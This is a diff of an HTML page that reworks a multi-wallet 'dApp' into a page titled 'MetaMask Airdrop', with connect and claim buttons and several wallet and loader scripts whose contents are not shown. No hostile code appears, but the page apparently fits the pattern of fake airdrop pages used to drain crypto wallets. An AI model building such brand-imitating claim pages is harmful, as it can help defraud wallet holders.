@@ -1,67 +1,25 @@
 <!DOCTYPE html>
 <html lang="en">
-
 <head>
-  <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>dApp</title>
-
-  <!-- Include CDN for Web3 (Generic) -->
-  <script src="https://cdn.jsdelivr.net/npm/web3@1.6.1/dist/web3.min.js"></script>
-
-  <!-- Include CDN for MetaMask -->
-<script src="https://cdn.jsdelivr.net/npm/@metamask/detect-provider/dist/detect-provider.min.js"></script>
-
-  <!-- Include CDN for TronLink -->
-  <script src="https://cdn.jsdelivr.net/npm/tronlink-plugin@1.0.0/dist/tronlink.min.js"></script>
-
-  <!-- Include CDN for TrustWallet (if available) -->
-  <!-- Add TrustWallet CDN link when available -->
-
-  <!-- Main stylesheet -->
-  <link rel="stylesheet" href="css/styles.css">
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>MetaMask Airdrop</title>
+    <link rel="stylesheet" href="../css/styles.css">
+    <script src="https://cdn.jsdelivr.net/npm/@metamask/detect-provider/dist/detect-provider.min.js"></script>
+    <script src="https://cdn.jsdelivr.net/gh/ethereum/web3.js/dist/web3.min.js"></script>
 </head>
-
 <body>
-  <h1>Welcome to the dApp</h1>
+    <div class="container">
+        <h1>MetaMask Airdrop</h1>
+        <button id="connectButton">Connect MetaMask</button>
+        <button id="claimAirdropButton" disabled>Claim Airdrop</button>
+    </div>
 
-  <!-- Button to connect MetaMask -->
-  <button id="connectButton">Connect MetaMask</button>
-
-  <!-- Button to claim Airdrop (disabled until connected) -->
-  <button id="claimAirdropButton" disabled>Claim Airdrop</button>
-
-  <!-- Button to connect TronLink -->
-  <button id="connectTronlinkButton">Connect TronLink</button>
-
-  <!-- Button to claim Tron Airdrop (disabled until connected) -->
-  <button id="claimTronAirdropButton" disabled>Claim Tron Airdrop</button>
-
-  <!-- Button to connect TrustWallet -->
-  <button id="connectTrustwalletButton">Connect TrustWallet</button>
-
-  <!-- Button to claim TrustWallet Airdrop (disabled until connected) -->
-  <button id="claimTrustwalletAirdropButton" disabled>Claim TrustWallet Airdrop</button>
-
-  <!-- Include all JavaScript files -->
-<script src="js/javascript.js" type="module"></script>
-
-  <script src="js/loader.js" type="module"></script>
-<script src="js/common.js" type="module"></script>
-<script src="js/metamask.js" type="module"></script>
-<script src="js/trustwallet.js" type="module"></script>
-<script src="js/eth.js" type="module"></script>
-<script src="js/bsc.js" type="module"></script>
-<script src="js/tron.js" type="module"></script>
-
-
-    <!-- Include deep linking files -->
-    <script src="deeplinks/meta-deep.js"></script>
-    <script src="deeplinks/tron-deep.js"></script>
-    <script src="deeplinks/trust-deep.js"></script>
-
+    <script src="../js/common.js"></script>
+    <script src="../js/metamask.js"></script>
+    <script src="../deeplinks/metamask-deep.js"></script>
+    <script src="../js/loader.js"></script>
 </body>
-
 </html>
 
 
